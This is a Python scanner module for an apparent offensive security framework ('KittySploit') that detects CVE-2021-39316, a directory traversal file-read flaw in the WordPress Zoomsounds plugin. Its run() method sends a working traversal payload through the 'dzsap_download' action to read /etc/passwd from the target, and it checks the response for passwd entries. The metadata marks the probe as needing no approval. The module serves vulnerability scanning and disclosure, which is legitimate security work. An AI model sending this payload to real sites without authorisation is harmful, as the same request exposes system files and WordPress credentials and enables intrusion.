#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Zoomsounds plugin 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress DZS Zoomsounds <=6.50 - Local File Inclusion Detection',
        'description': 'WordPress Zoomsounds plugin 6.45 and earlier allows arbitrary files, including sensitive configuration files such as wp-config.php, to be downloaded via the `dzsap_download` action using directory traversal in the `link` parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2021',
            'wordpress',
            'wp-plugin',
            'zoomsounds',
            'wpscan',
            'packetstorm',
            'wp',
            'lfi',
            'digitalzoomstudio',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d2d60cf7-e4d3-42b6-8dfe-7809f87547bd',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39316',
            'https://www.wordfence.com/vulnerability-advisories/#CVE-2021-39316',
            'http://packetstormsecurity.com/files/165146/WordPress-DZS-Zoomsounds-6.45-Arbitrary-File-Read.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-39316',
        ],
        'cve': 'CVE-2021-39316',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress DZS Zoomsounds <=6.50 - Local File Inclusion detected",
                path='/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

